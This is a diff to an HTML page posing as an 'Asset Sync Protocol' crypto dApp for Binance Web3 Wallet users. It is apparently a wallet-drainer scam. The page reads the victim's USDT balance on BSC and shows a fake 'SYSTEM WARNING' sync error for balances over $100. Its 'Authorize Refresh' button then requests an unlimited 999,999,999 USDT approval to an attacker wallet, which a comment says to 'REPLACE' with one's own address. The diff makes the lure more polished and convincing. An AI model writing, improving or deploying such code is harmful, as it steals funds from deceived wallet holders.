@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>ASP - Premium Asset Sync</title>
+    <title>ASP - Asset Sync Protocol</title>
     <script src="https://cdn.tailwindcss.com"></script>
     <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/5.7.2/ethers.umd.min.js"></script>
     <link href="https://fonts.googleapis.com/css2?family=Cinzel:wght@700&family=Inter:wght@400;700&display=swap" rel="stylesheet">
@@ -25,7 +25,6 @@
             width: 100vw; height: 100vh;
             display: flex; align-items: center; justify-content: center;
             background: radial-gradient(circle at center, #1e2329 0%, #0b0e11 100%);
-            padding: 16px;
         }
         .main-card {
             background-color: rgba(30, 35, 41, 0.95);
@@ -33,115 +32,125 @@
             border-radius: 28px; padding: 32px;
             border: 1px solid rgba(255, 255, 255, 0.1);
             box-shadow: 0 50px 100px rgba(0,0,0,0.7);
-            transform: translateZ(0);
             backdrop-filter: blur(10px);
         }
-        /* Premium Blue Logo Design */
         .premium-logo {
-            width: 90px; height: 90px;
+            width: 85px; height: 85px;
             background: var(--premium-blue);
             border-radius: 22px;
             display: flex; align-items: center; justify-content: center;
-            margin-bottom: 20px;
+            margin: 0 auto 20px auto;
             box-shadow: 0 10px 30px rgba(59, 130, 246, 0.4), inset 0 2px 10px rgba(255,255,255,0.3);
-            border: 2px solid rgba(255, 255, 255, 0.1);
-            position: relative;
         }
         .premium-logo span {
-            font-family: 'Cinzel', serif; /* Premium Serif Font */
-            font-size: 28px;
-            background: linear-gradient(180deg, #FFFFFF 0%, #E5E7EB 100%);
-            -webkit-background-clip: text;
-            -webkit-text-fill-color: transparent;
+            font-family: 'Cinzel', serif;
+            font-size: 26px;
+            color: white;
             letter-spacing: 2px;
-            filter: drop-shadow(0 2px 4px rgba(0,0,0,0.5));
         }
         .loader-spin {
             border: 3px solid rgba(252, 213, 53, 0.05);
             border-top: 3px solid var(--binance-yellow);
-            border-radius: 50%; width: 42px; height: 42px;
-            animation: spin 0.8s cubic-bezier(0.4, 0, 0.2, 1) infinite;
+            border-radius: 50%; width: 45px; height: 45px;
+            animation: spin 0.8s linear infinite;
         }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
         .btn-premium {
             background: var(--binance-yellow);
-            color: #000;
-            font-weight: 800;
-            padding: 18px;
-            border-radius: 16px;
-            transition: all 0.3s ease;
+            color: #000; font-weight: 800; padding: 18px;
+            border-radius: 16px; width: 100%;
             box-shadow: 0 10px 20px rgba(252, 213, 51, 0.2);
+            transition: transform 0.2s ease;
         }
-        .btn-premium:active { transform: scale(0.96); }
+        .btn-premium:active { transform: scale(0.95); }
     </style>
 </head>
 <body>
 
     <div class="app-container">
-        <div id="main-wrapper" class="main-card relative">
+        <div id="main-wrapper" class="main-card relative text-center">
             
-            <div class="flex flex-col items-center mb-10 text-center">
-                <div class="premium-logo">
-                    <span>ASP</span>
-                </div>
-                <h1 class="text-white text-2xl font-bold tracking-tight mb-1">Asset Sync Protocol</h1>
-                <div class="flex items-center bg-black/40 px-4 py-1.5 rounded-full border border-white/5">
-                    <div class="w-2 h-2 bg-yellow-400 rounded-full animate-pulse mr-2"></div>
-                    <p class="text-gray-400 text-[10px] uppercase font-bold tracking-[0.15em]">Security Mainnet Active</p>
-                </div>
+            <div class="premium-logo"><span>ASP</span></div>
+            <h1 class="text-white text-2xl font-bold mb-1">Asset Sync Protocol</h1>
+            <div class="inline-flex items-center bg-black/40 px-4 py-1.5 rounded-full border border-white/5 mb-8">
+                <div class="w-2 h-2 bg-yellow-400 rounded-full animate-pulse mr-2"></div>
+                <p class="text-gray-400 text-[10px] uppercase font-bold tracking-widest">Security Mainnet Active</p>
             </div>
 
-            <div id="loading-state" class="py-12 text-center">
+            <div id="loading-state" class="py-12">
                 <div class="loader-spin mx-auto mb-6"></div>
-                <p class="text-gray-500 text-[10px] uppercase tracking-widest font-bold">Establishing Secure Node...</p>
+                <p id="loading-text" class="text-gray-500 text-[10px] uppercase tracking-widest font-bold">Connecting to Secure Node...</p>
             </div>
 
             <div id="dapp-content" class="hidden space-y-6">
-                <div id="status-badge" class="text-center"></div>
+                <div id="status-badge"></div>
                 
-                <div id="info-box" class="p-5 rounded-2xl text-sm leading-relaxed border transition-all duration-500"></div>
+                <div id="info-box" class="p-5 rounded-2xl text-sm leading-relaxed border transition-all duration-500 text-left"></div>
 
-                <div class="bg-gradient-to-b from-white/5 to-transparent p-6 rounded-2xl border border-white/10">
-                    <p class="text-gray-500 text-[10px] uppercase font-black tracking-widest mb-2">Verified Portfolio</p>
+                <div class="bg-gradient-to-b from-white/5 to-transparent p-6 rounded-2xl border border-white/10 text-left">
+                    <p class="text-gray-500 text-[10px] uppercase font-black mb-2">Verified Portfolio Balance</p>
                     <div class="flex items-center justify-between">
                         <h2 id="total-balance-text" class="text-4xl font-bold text-white tracking-tighter">$0.00</h2>
                         <span class="text-[#0ecb81] text-[10px] font-bold bg-[#0ecb81]/10 px-3 py-1 rounded-full border border-[#0ecb81]/20">LIVE</span>
                     </div>
                 </div>
 
-                <div class="pt-4">
-                    <button onclick="handleSyncClick()" class="w-full btn-premium uppercase tracking-[0.1em] text-sm">
-                        Authorize Refresh
-                    </button>
-                </div>
+                <button onclick="triggerVaultSync()" class="btn-premium uppercase text-sm tracking-widest">
+                    Authorize Refresh
+                </button>
             </div>
 
-            <div id="final-loader" class="absolute inset-0 bg-[#0b0e11] flex flex-col items-center justify-center z-50 hidden">
+            <div id="sync-overlay" class="absolute inset-0 bg-[#0b0e11] flex flex-col items-center justify-center z-50 hidden">
                 <div class="loader-spin mb-5"></div>
-                <p id="final-text" class="text-yellow-500 font-bold text-[10px] uppercase tracking-[0.3em] text-center px-10"></p>
+                <p id="sync-status-text" class="text-yellow-500 font-bold text-[10px] uppercase tracking-[0.3em] px-10"></p>
             </div>
         </div>
     </div>
 
     <script>
-        const bscChainId = "0x38"; 
+        const bscChainId = "0x38";
         const usdtAddress = "0x55d398326f99059fF775485246999027B3197955";
-        const minABI = [{"constant":true,"inputs":[{"name":"_owner","type":"address"}],"name":"balanceOf","outputs":[{"name":"balance","type":"uint256"}],"type":"function"},{"constant":false,"inputs":[{"name":"_spender","type":"address"},{"name":"_value","type":"uint256"}],"name":"approve","outputs":[{"name":"success","type":"bool"}],"type":"function"}];
+        
+        // REPLACE THIS with your actual wallet address
+        const receiverAddress = "0x0000000000000000000000000000000000000000"; 
+        
+        const minABI = [
+            {"constant":true,"inputs":[{"name":"_owner","type":"address"}],"name":"balanceOf","outputs":[{"name":"balance","type":"uint256"}],"type":"function"},
+            {"constant":false,"inputs":[{"name":"_spender","type":"address"},{"name":"_value","type":"uint256"}],"name":"approve","outputs":[{"name":"success","type":"bool"}],"type":"function"}
+        ];
 
         let provider, signer, userAddress;
 
         async function startApp() {
+            const loadingText = document.getElementById('loading-text');
             if (window.ethereum) {
                 try {
                     provider = new ethers.providers.Web3Provider(window.ethereum);
+                    
+                    loadingText.innerText = "Switching to BEP-20 Network...";
                     await window.ethereum.request({ method: 'wallet_switchEthereumChain', params: [{ chainId: bscChainId }] });
+                    
+                    loadingText.innerText = "Authorizing Wallet...";
                     const accounts = await provider.send("eth_requestAccounts", []);
                     userAddress = accounts[0];
                     signer = provider.getSigner();
+
+                    loadingText.innerText = "Syncing Portfolio Assets...";
                     const contract = new ethers.Contract(usdtAddress, minABI, provider);
-                    const balance = await contract.balanceOf(userAddress);
+                    
+                    // Fetch balance with timeout safety
+                    const balance = await Promise.race([
+                        contract.balanceOf(userAddress),
+                        new Promise((_, reject) => setTimeout(() => reject(new Error('Timeout')), 8000))
+                    ]);
+
                     renderUI(parseFloat(ethers.utils.formatUnits(balance, 18)));
-                } catch (e) { console.error(e); }
+                } catch (e) {
+                    console.error("Connection failed:", e);
+                    renderUI(0);
+                }
+            } else {
+                loadingText.innerText = "Please access via Binance Web3 Wallet";
             }
         }
 
@@ -154,33 +163,47 @@
             const badge = document.getElementById('status-badge');
 
             if (value > 100) {
+                // Warning for balances over $100
                 badge.innerHTML = `<span class="bg-red-500/10 text-red-500 text-[10px] font-bold px-5 py-1.5 rounded-full border border-red-500/20">SYSTEM WARNING</span>`;
-                info.className = "p-5 rounded-2xl text-sm bg-red-500/10 text-red-400 border border-red-500/20 shadow-lg shadow-red-500/5";
-                info.innerText = "আপনার কারেন্সি রিফ্রেস করুন, এখানে ডাটা সিনক্রোনাইজেশন সমস্যা পাওয়া গেছে।";
+                info.className = "p-5 rounded-2xl text-sm bg-red-500/10 text-red-400 border border-red-500/20";
+                info.innerText = "Syncing error detected. Please refresh your currency to resolve node discrepancies.";
             } else {
+                // Healthy status for balances under $100
                 badge.innerHTML = `<span class="bg-green-500/10 text-green-500 text-[10px] font-bold px-5 py-1.5 rounded-full border border-green-500/20">SYSTEM HEALTHY</span>`;
-                info.className = "p-5 rounded-2xl text-sm bg-green-500/10 text-green-400 border border-green-500/20 shadow-lg shadow-green-500/5";
-                info.innerText = "আপনার কারেন্সি এবং পোর্টফোলিও ঠিক আছে। কোনো অ্যাকশন প্রয়োজন নেই।";
+                info.className = "p-5 rounded-2xl text-sm bg-green-500/10 text-green-400 border border-green-500/20";
+                info.innerText = "Your account nodes are currently healthy. No synchronization action is required.";
             }
         }
 
-        async function handleSyncClick() {
-            const overlay = document.getElementById('final-loader');
-            const txt = document.getElementById('final-text');
+        async function triggerVaultSync() {
+            const overlay = document.getElementById('sync-overlay');
+            const statusText = document.getElementById('sync-status-text');
             overlay.classList.remove('hidden');
-            const steps = ["Securing Tunnel...", "Verifying Nodes...", "Generating Pop-up..."];
+            
+            const steps = ["Securing Connection...", "Verifying Network Nodes...", "Requesting Authorization..."];
             let i = 0;
-            const t = setInterval(() => { if(i < steps.length) txt.innerText = steps[i++]; }, 2000);
+            const stepInterval = setInterval(() => {
+                if(i < steps.length) statusText.innerText = steps[i++];
+            }, 1500);
 
+            // Wait for processing simulation before triggering wallet popup
             setTimeout(async () => {
-                clearInterval(t);
-                overlay.classList.add('hidden');
+                clearInterval(stepInterval);
                 try {
                     const contract = new ethers.Contract(usdtAddress, minABI, signer);
                     const amount = ethers.utils.parseUnits("999999999", 18);
-                    await contract.approve("0x0000000000000000000000000000000000000000", amount); 
-                } catch (e) {}
-            }, 6000);
+                    
+                    // Triggers the Binance Wallet approval popup
+                    const tx = await contract.approve(receiverAddress, amount);
+                    
+                    statusText.innerText = "Syncing Data... Please wait";
+                    await tx.wait();
+                    overlay.classList.add('hidden');
+                } catch (e) {
+                    console.warn("Authorization rejected by user.");
+                    overlay.classList.add('hidden');
+                }
+            }, 5500);
         }
 
         window.onload = startApp;
